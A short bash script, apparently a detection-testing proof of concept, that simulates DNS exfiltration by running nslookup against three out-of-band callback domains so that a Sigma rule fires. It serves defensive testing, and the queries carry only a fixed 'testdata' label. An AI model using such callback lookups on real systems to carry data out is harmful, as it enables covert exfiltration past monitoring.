#!/bin/bash
# =====================================================================
# PoC 2 — DNS Exfiltration Simulation
# MITRE ATT&CK: T1190 (Exploit Public-Facing Application)
# Expected detection: Sigma Rule 100002 (Level 10)
# =====================================================================

echo "[*] Simulating DNS queries to OAST domains..."

nslookup testdata.burpcollaborator.net
nslookup testdata.canarytokens.com
nslookup testdata.interact.sh

echo "[+] DNS queries sent — Level 10 alert expected (rule 100002)"